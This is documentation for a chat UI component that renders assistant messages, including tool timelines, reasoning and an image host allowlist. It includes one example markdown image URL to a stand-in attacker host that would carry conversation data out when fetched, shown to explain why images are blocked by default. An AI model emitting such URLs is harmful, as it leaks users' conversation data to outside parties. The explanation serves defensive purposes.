A whole assistant `UIMessage`, part by part: streaming-safe markdown, collapsible reasoning that summarizes how long the model thought, consecutive tool parts grouped into one timeline with inline approval cards, files, `data-*` parts through `renderData`, and sources. `renderTool` lets you take over any tool part, as [the quickstart](/docs/getting-started#render-a-run) does for `review_changes` with a `DiffReview`. What `renderTool` and `renderData` return is your content: with `styles.css`, the kit's rules don't reach into it, and components you render there are styled as usual.

Images in text and reasoning don't load unless they're allowed: a URL in model output can carry data out of the conversation as soon as the browser fetches it (`![](https://attacker.example/p.png?d=…)`), so by default an image renders as a link with its alt text, or as plain text inside the link it belongs to (a badge). `allowedImageHosts` takes:

- host names: `'images.example.com'` matches any port, `'localhost:3000'` only that port;
- `'self'`: relative URLs such as `/logo.png`, which load from your own origin. Protocol-relative URLs (`//host/x`) are not relative, and absolute URLs to your own site need their host listed. Relative requests carry your cookies, so allow `'self'` only if GET requests to your origin have no side effects;
- `'*'`: every image.

```tsx
const IMAGE_HOSTS = ['images.example.com', 'self'];

<AgentMessage message={last} allowedImageHosts={IMAGE_HOSTS} />;
```

The list is compared by value, so an inline array works as well: it does not re-render the finished text on every streamed delta. Image file parts follow the same list, except that `data:` and `blob:` URLs, which need no request, always preview.
